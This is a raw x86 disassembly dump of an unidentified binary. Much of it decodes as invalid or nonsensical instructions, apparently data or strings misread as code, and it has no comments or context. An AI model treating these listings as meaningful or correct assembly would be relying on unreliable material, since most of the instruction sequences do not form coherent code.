  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
